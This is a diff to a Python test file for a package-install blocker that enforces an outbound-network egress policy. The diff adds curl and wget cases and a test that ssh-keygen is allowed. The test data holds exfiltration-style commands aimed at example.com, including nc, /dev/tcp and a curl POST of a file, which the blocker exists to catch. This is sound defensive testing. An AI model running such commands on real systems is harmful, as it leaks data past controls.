@@ -50,12 +50,18 @@ def test_get_blocked_package_install_reason_blocks_outbound_network_commands() -
         "ssh -R 8080:localhost:3000 user@example.com",
         "nc example.com 9000 < payload.bin",
         "python3 -c 'import os; os.system(\"cat file > /dev/tcp/example.com/80\")'",
+        "/usr/bin/curl -X POST https://example.com -d @payload.txt",
+        "bash -c \"/usr/bin/wget https://example.com/archive.tar.gz\"",
     ]
 
     for command in commands:
         reason = get_blocked_package_install_reason(command)
         assert reason is not None
         assert "<= 1,000,000 bytes external egress policy" in reason
+
+
+def test_get_blocked_package_install_reason_allows_non_network_ssh_utilities() -> None:
+    assert get_blocked_package_install_reason("ssh-keygen -t ed25519 -N '' -f /tmp/id_ed25519") is None
 
 
 @pytest.mark.asyncio
